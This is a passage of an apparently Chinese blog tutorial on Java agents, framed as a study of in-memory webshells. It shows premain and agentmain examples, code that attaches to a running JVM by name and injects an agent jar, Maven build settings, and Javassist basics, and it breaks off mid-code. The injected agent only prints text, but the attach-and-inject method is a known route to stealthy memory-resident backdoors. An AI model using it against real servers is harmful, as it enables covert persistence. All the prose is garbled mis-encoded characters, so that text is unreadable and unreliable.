-javaagent:agent.jar=Hello -jar hello.jar</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ agent ä¸­ premain çš„ä»£ç è¢«ä¼˜å…ˆæ‰§è¡Œäº†</p><img src="/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/agentSuccess.png" class><ul><li>ä»¥ä¸Šå°±æ˜¯ Premain-Agent çš„å·¥ä½œå®ä¾‹</li></ul><h3 id="agentmain-Agent"><a href="#agentmain-Agent" class="headerlink" title="agentmain-Agent"></a>agentmain-Agent</h3><p>ç›¸è¾ƒäº premain-Agent åªèƒ½åœ¨ JVM å¯åŠ¨å‰åŠ è½½ï¼Œagentmain-Agent èƒ½å¤Ÿåœ¨JVMå¯åŠ¨ä¹‹ååŠ è½½å¹¶å®ç°ç›¸åº”çš„ä¿®æ”¹å­—èŠ‚ç åŠŸèƒ½ã€‚ä¸‹é¢æˆ‘ä»¬æ¥äº†è§£ä¸€ä¸‹å’Œ JVM æœ‰å…³çš„ä¸¤ä¸ªç±»ã€‚</p><h4 id="VirtualMachineç±»"><a href="#VirtualMachineç±»" class="headerlink" title="VirtualMachineç±»"></a>VirtualMachineç±»</h4><p><code>com.sun.tools.attach.VirtualMachine</code>ç±»å¯ä»¥å®ç°è·å–JVMä¿¡æ¯ï¼Œå†…å­˜dumpã€ç°æˆdumpã€ç±»ä¿¡æ¯ç»Ÿè®¡ï¼ˆä¾‹å¦‚JVMåŠ è½½çš„ç±»ï¼‰ç­‰åŠŸèƒ½ã€‚</p><p>è¯¥ç±»å…è®¸æˆ‘ä»¬é€šè¿‡ç»™ attach æ–¹æ³•ä¼ å…¥ä¸€ä¸ª JVM çš„ PIDï¼Œæ¥è¿œç¨‹è¿æ¥åˆ°è¯¥ JVM ä¸Š ï¼Œä¹‹åæˆ‘ä»¬å°±å¯ä»¥å¯¹è¿æ¥çš„ JVM è¿›è¡Œå„ç§æ“ä½œï¼Œå¦‚æ³¨å…¥ Agentã€‚ä¸‹é¢æ˜¯è¯¥ç±»çš„ä¸»è¦æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å…è®¸æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªJVMçš„PIDï¼Œç„¶åè¿œç¨‹è¿æ¥åˆ°è¯¥JVMä¸Š</span></span><br><span class="line">VirtualMachine.attach()</span><br><span class="line"> </span><br><span class="line"><span class="comment">//å‘JVMæ³¨å†Œä¸€ä¸ªä»£ç†ç¨‹åºagentï¼Œåœ¨è¯¥agentçš„ä»£ç†ç¨‹åºä¸­ä¼šå¾—åˆ°ä¸€ä¸ªInstrumentationå®ä¾‹ï¼Œè¯¥å®ä¾‹å¯ä»¥ åœ¨classåŠ è½½å‰æ”¹å˜classçš„å­—èŠ‚ç ï¼Œä¹Ÿå¯ä»¥åœ¨classåŠ è½½åé‡æ–°åŠ è½½ã€‚åœ¨è°ƒç”¨Instrumentationå®ä¾‹çš„æ–¹æ³•æ—¶ï¼Œè¿™äº›æ–¹æ³•ä¼šä½¿ç”¨ClassFileTransformeræ¥å£ä¸­æä¾›çš„æ–¹æ³•è¿›è¡Œå¤„ç†</span></span><br><span class="line">VirtualMachine.loadAgent()</span><br><span class="line"> </span><br><span class="line"><span class="comment">//è·å¾—å½“å‰æ‰€æœ‰çš„JVMåˆ—è¡¨</span></span><br><span class="line">VirtualMachine.list()</span><br><span class="line"> </span><br><span class="line"><span class="comment">//è§£é™¤ä¸ç‰¹å®šJVMçš„è¿æ¥</span></span><br><span class="line">VirtualMachine.detach()</span><br></pre></td></tr></table></figure><h4 id="VirtualMachineDescriptor-ç±»"><a href="#VirtualMachineDescriptor-ç±»" class="headerlink" title="VirtualMachineDescriptor ç±»"></a>VirtualMachineDescriptor ç±»</h4><p><code>com.sun.tools.attach.VirtualMachineDescriptor</code>ç±»æ˜¯ä¸€ä¸ªç”¨æ¥æè¿°ç‰¹å®šè™šæ‹Ÿæœºçš„ç±»ï¼Œå…¶æ–¹æ³•å¯ä»¥è·å–è™šæ‹Ÿæœºçš„å„ç§ä¿¡æ¯å¦‚PIDã€è™šæ‹Ÿæœºåç§°ç­‰ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªè·å–ç‰¹å®šè™šæ‹ŸæœºPIDçš„ç¤ºä¾‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;  </span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.util.List;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">get_PID</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//è°ƒç”¨VirtualMachine.list()è·å–æ­£åœ¨è¿è¡Œçš„JVMåˆ—è¡¨  </span></span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();  </span><br><span class="line">        <span class="keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">//éå†æ¯ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„JVMï¼Œå¦‚æœJVMåç§°ä¸ºget_PIDåˆ™è¿”å›å…¶PID  </span></span><br><span class="line">            <span class="keyword">if</span>(vmd.displayName().equals(<span class="string">&quot;com.drunkbaby.get_PID&quot;</span>))  </span><br><span class="line">                System.out.println(vmd.id());  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/JVMAttach.png" class><p>ä¸‹é¢æˆ‘ä»¬å°±æ¥å®ç°ä¸€ä¸ª<code>agentmain-Agent</code>ã€‚é¦–å…ˆæˆ‘ä»¬ç¼–å†™ä¸€ä¸ª <code>Sleep_Hello</code> ç±»ï¼Œæ¨¡æ‹Ÿæ­£åœ¨è¿è¡Œçš„ JVM</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Thread.sleep;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Sleep_Hello</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;  </span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;  </span><br><span class="line">            System.out.println(<span class="string">&quot;Hello World!&quot;</span>);  </span><br><span class="line">            sleep(<span class="number">5000</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åç¼–å†™æˆ‘ä»¬çš„ agentmain-Agent ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Thread.sleep;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Java_Agent_agentmain</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String args, Instrumentation inst)</span> <span class="keyword">throws</span> InterruptedException &#123;  </span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;  </span><br><span class="line">            System.out.println(<span class="string">&quot;è°ƒç”¨äº†agentmain-Agent!&quot;</span>);  </span><br><span class="line">            sleep(<span class="number">3000</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒæ—¶é…ç½® agentmain.mf æ–‡ä»¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Agent-Class: com.drunkbaby.Java_Agent_agentmain</span><br></pre></td></tr></table></figure><p>æ¥ç€ï¼Œç¼–è¯‘æ‰“åŒ…æˆ jar æ–‡ä»¶</p><p>æ‰“åŒ…æˆ jar åŒ…çš„æ–¹å¼å»ºè®®æ˜¯åœ¨ pom.xml å½“ä¸­æ·»åŠ ä»¥ä¸‹å†…å®¹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">plugins</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-assembly-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">descriptorRefs</span>&gt;</span>  </span><br><span class="line">          <span class="tag">&lt;<span class="name">descriptorRef</span>&gt;</span>jar-with-dependencies<span class="tag">&lt;/<span class="name">descriptorRef</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;/<span class="name">descriptorRefs</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">archive</span>&gt;</span>  </span><br><span class="line">          <span class="tag">&lt;<span class="name">manifestFile</span>&gt;</span>  </span><br><span class="line">            src/main/resources/META-INF/MAINFEST.MF  </span><br><span class="line">          <span class="tag">&lt;/<span class="name">manifestFile</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;/<span class="name">archive</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">source</span>&gt;</span>6<span class="tag">&lt;/<span class="name">source</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">target</span>&gt;</span>6<span class="tag">&lt;/<span class="name">target</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ¥ç€ç”¨ <code>mvn:assembly</code> å‘½ä»¤æ‰“åŒ…æˆ jar åŒ…å³å¯</p><img src="/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/agentmainBuild.png" class><p>è·å–2ä¸ª jar åŒ…ï¼Œæˆ‘ä»¬éœ€è¦çš„æ˜¯ç¬¬äºŒä¸ªï¼Œéšåæˆ‘ä»¬è®¾ç½® <strong>VM-OPTIONS</strong> (æœ€å¤§çš„å‘ï¼‰ï¼Œè¿™ä¸ª vm-options åœ¨æ–°ç‰ˆ UI é‡Œé»˜è®¤æ˜¯éšè—äº†èµ·æ¥çš„ï¼Œæ‰€ä»¥ä½ è¦æŠŠä»–æ‰“å¼€ï¼Œå¦åˆ™ä½ å¾ˆå®¹æ˜“æŠŠå®ƒå’Œå˜é‡åˆ—è¡¨ææ··ï¼š</p><p>æœ€åå‡†å¤‡ä¸€ä¸ª Inject ç±»ï¼Œå°†æˆ‘ä»¬çš„ agent-main æ³¨å…¥ç›®æ ‡ JVMï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Inject_Agent</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;  </span><br><span class="line">        <span class="comment">//è°ƒç”¨VirtualMachine.list()è·å–æ­£åœ¨è¿è¡Œçš„JVMåˆ—è¡¨  </span></span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();  </span><br><span class="line">        <span class="keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;  </span><br><span class="line">            <span class="comment">//éå†æ¯ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„JVMï¼Œå¦‚æœJVMåç§°ä¸ºSleep_Helloåˆ™è¿æ¥è¯¥JVMå¹¶åŠ è½½ç‰¹å®šAgent  </span></span><br><span class="line">            <span class="keyword">if</span>(vmd.displayName().equals(<span class="string">&quot;com.drunkbaby.Sleep_Hello&quot;</span>))&#123;  </span><br><span class="line">  </span><br><span class="line">                <span class="comment">//è¿æ¥æŒ‡å®šJVM  </span></span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">virtualMachine</span> <span class="operator">=</span> VirtualMachine.attach(vmd.id());  </span><br><span class="line">                <span class="comment">//åŠ è½½Agent  </span></span><br><span class="line">                virtualMachine.loadAgent(<span class="string">&quot;E:\\Coding\\Java\\Java-Agent-Memshell\\Agentmain\\target\\agentdemo-1.0-SNAPSHOT-jar-with-dependencies.jar&quot;</span>);  </span><br><span class="line">                <span class="comment">//æ–­å¼€JVMè¿æ¥  </span></span><br><span class="line">                virtualMachine.detach();  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…ˆè¿è¡Œç›®æ ‡ JVMï¼Œå†è¿è¡Œ inject ç±»è¿›è¡Œæ³¨å…¥ï¼Œæœ€åç»“æœå¦‚ä¸‹ï¼Œä¸€å¼€å§‹æ˜¯åªè¾“å‡º hello, world çš„ï¼Œè¿è¡Œ inject ä¹‹åå°±æ’å…¥äº† agent-main æ–¹æ³•ï¼š</p><img src="/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/successAgentMainInject.png" class><h3 id="åŠ¨æ€ä¿®æ”¹å­—èŠ‚ç -Instrumentation"><a href="#åŠ¨æ€ä¿®æ”¹å­—èŠ‚ç -Instrumentation" class="headerlink" title="åŠ¨æ€ä¿®æ”¹å­—èŠ‚ç  Instrumentation"></a>åŠ¨æ€ä¿®æ”¹å­—èŠ‚ç  Instrumentation</h3><p>åœ¨å®ç° premain çš„æ—¶å€™ï¼Œæˆ‘ä»¬é™¤äº†èƒ½è·å–åˆ° agentArgs å‚æ•°ï¼Œè¿˜å¯ä»¥è·å– Instrumentation å®ä¾‹ï¼Œé‚£ä¹ˆ Instrumentation å®ä¾‹æ˜¯ä»€ä¹ˆï¼Œåœ¨èŠè¿™ä¸ªä¹‹å‰è¦å…ˆç®€å•äº†è§£ä¸€ä¸‹ Javassist</p><h4 id="Javassist"><a href="#Javassist" class="headerlink" title="Javassist"></a>Javassist</h4><h5 id="ä»€ä¹ˆæ˜¯-Javassist"><a href="#ä»€ä¹ˆæ˜¯-Javassist" class="headerlink" title="ä»€ä¹ˆæ˜¯ Javassist"></a>ä»€ä¹ˆæ˜¯ Javassist</h5><p>Java å­—èŠ‚ç ä»¥äºŒè¿›åˆ¶çš„å½¢å¼å­˜å‚¨åœ¨ .class æ–‡ä»¶ä¸­ï¼Œæ¯ä¸€ä¸ª.classæ–‡ä»¶åŒ…å«ä¸€ä¸ªJavaç±»æˆ–æ¥å£ã€‚Javaassist å°±æ˜¯ä¸€ä¸ªç”¨æ¥å¤„ç†Javaå­—èŠ‚ç çš„ç±»åº“ã€‚å®ƒå¯ä»¥åœ¨ä¸€ä¸ªå·²ç»ç¼–è¯‘å¥½çš„ç±»ä¸­æ·»åŠ æ–°çš„æ–¹æ³•ï¼Œæˆ–è€…æ˜¯ä¿®æ”¹å·²æœ‰çš„æ–¹æ³•ï¼Œå¹¶ä¸”ä¸éœ€è¦å¯¹å­—èŠ‚ç æ–¹é¢æœ‰æ·±å…¥çš„äº†è§£ã€‚åŒæ—¶ä¹Ÿå¯ä»¥é€šè¿‡æ‰‹åŠ¨çš„æ–¹å¼å»ç”Ÿæˆä¸€ä¸ªæ–°çš„ç±»å¯¹è±¡ã€‚å…¶ä½¿ç”¨æ–¹å¼ç±»ä¼¼äºåå°„ã€‚</p><h5 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h5><p><code>ClassPool</code>æ˜¯<code>CtClass</code>å¯¹è±¡çš„å®¹å™¨ã€‚<code>CtClass</code>å¯¹è±¡å¿…é¡»ä»è¯¥å¯¹è±¡è·å¾—ã€‚å¦‚æœ<code>get()</code>åœ¨æ­¤å¯¹è±¡ä¸Šè°ƒç”¨ï¼Œåˆ™å®ƒå°†æœç´¢è¡¨ç¤ºçš„å„ç§æº<code>ClassPath</code>Â ä»¥æŸ¥æ‰¾ç±»æ–‡ä»¶ï¼Œç„¶ååˆ›å»ºä¸€ä¸ª<code>CtClass</code>è¡¨ç¤ºè¯¥ç±»æ–‡ä»¶çš„å¯¹è±¡ã€‚åˆ›å»ºçš„å¯¹è±¡å°†è¿”å›ç»™è°ƒç”¨è€…ã€‚å¯ä»¥å°†å…¶ç†è§£ä¸ºä¸€ä¸ªå­˜æ”¾<code>CtClass</code>å¯¹è±¡çš„å®¹å™¨ã€‚</p><p>è·å¾—æ–¹æ³•ï¼šÂ <code>ClassPool cp = ClassPool.getDefault();</code>ã€‚é€šè¿‡Â <code>ClassPool.getDefault()</code>Â è·å–çš„Â <code>ClassPool</code>Â ä½¿ç”¨ JVM çš„ç±»æœç´¢è·¯å¾„ã€‚<strong>å¦‚æœç¨‹åºè¿è¡Œåœ¨ JBoss æˆ–è€… Tomcat ç­‰ Web æœåŠ¡å™¨ä¸Šï¼ŒClassPool å¯èƒ½æ— æ³•æ‰¾åˆ°ç”¨æˆ·çš„ç±»</strong>ï¼Œå› ä¸ºWebæœåŠ¡å™¨ä½¿ç”¨å¤šä¸ªç±»åŠ è½½å™¨ä½œä¸ºç³»ç»Ÿç±»åŠ è½½å™¨ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ<strong>ClassPool å¿…é¡»æ·»åŠ é¢å¤–çš„ç±»æœç´¢è·¯å¾„</strong>ã€‚</p><p><code>cp.insertClassPath(new ClassClassPath(&lt;Class&gt;));</code></p><h5 id="CtClass"><a href="#CtClass" class="headerlink" title="CtClass"></a>CtClass</h5><p>å¯ä»¥å°†å…¶ç†è§£æˆåŠ å¼ºç‰ˆçš„Classå¯¹è±¡ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡CtClasså¯¹ç›®æ ‡ç±»è¿›è¡Œå„ç§æ“ä½œã€‚å¯ä»¥<code>ClassPool.get(ClassName)</code>ä¸­è·å–ã€‚</p><h5 id="CtMethod"><a href="#CtMethod" class="headerlink" title="CtMethod"></a>CtMethod</h5><p>åŒç†ï¼Œå¯ä»¥ç†è§£æˆåŠ å¼ºç‰ˆçš„<code>Method</code>å¯¹è±¡ã€‚å¯é€šè¿‡<code>CtClass.getDeclaredMethod(MethodName)</code>è·å–ï¼Œè¯¥ç±»æä¾›äº†ä¸€äº›æ–¹æ³•ä»¥ä¾¿æˆ‘ä»¬èƒ½å¤Ÿç›´æ¥ä¿®æ”¹æ–¹æ³•ä½“</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">CtMethod</span> <span class="keyword">extends</span> <span class="title class_">CtBehavior</span> &#123;</span><br><span class="line">    <span class="comment">// ä¸»è¦çš„å†…å®¹éƒ½åœ¨çˆ¶ç±» CtBehavior ä¸­</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// çˆ¶ç±» CtBehavior</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">CtBehavior</span> <span class="keyword">extends</span> <span class="title class_">CtMember</span> &#123;</span><br><span class="line">    <span class="comment">// è®¾ç½®æ–¹æ³•ä½“</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBody</span><span class="params">(String src)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// æ’å…¥åœ¨æ–¹æ³•ä½“æœ€å‰é¢</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertBefore</span><span class="params">(String src)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// æ’å…¥åœ¨æ–¹æ³•ä½“æœ€åé¢</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertAfter</span><span class="params">(String src)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// åœ¨æ–¹æ³•ä½“çš„æŸä¸€è¡Œæ’å…¥å†…å®¹</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">insertAt</span><span class="params">(<span class="type">int</span> lineNum, String src)</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼ é€’ç»™æ–¹æ³•Â <code>insertBefore()</code>Â ï¼Œ<code>insertAfter()</code>Â å’ŒÂ <code>insertAt()</code>Â çš„ String å¯¹è±¡<strong>æ˜¯ç”±<code>Javassist</code>Â çš„ç¼–è¯‘å™¨ç¼–è¯‘çš„</strong>ã€‚ ç”±äºç¼–è¯‘å™¨æ”¯æŒè¯­è¨€æ‰©å±•ï¼Œä»¥ $ å¼€å¤´çš„å‡ ä¸ªæ ‡è¯†ç¬¦æœ‰ç‰¹æ®Šçš„å«ä¹‰ï¼š</p><img src="/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/javassist.png" class><h5 id="ä½¿ç”¨ç¤ºä¾‹"><a href="#ä½¿ç”¨ç¤ºä¾‹" class="headerlink" title="ä½¿ç”¨ç¤ºä¾‹"></a>ä½¿ç”¨ç¤ºä¾‹</h5><p><strong>pom.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.27.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ›å»ºæµ‹è¯•ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> javassist;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Javassist_Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Create_Person</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è·å– CtClass å¯¹è±¡çš„å®¹å™¨ ClassPool</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åˆ›å»ºä¸€ä¸ªæ–°ç±» Javassist.Learning.Person</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span 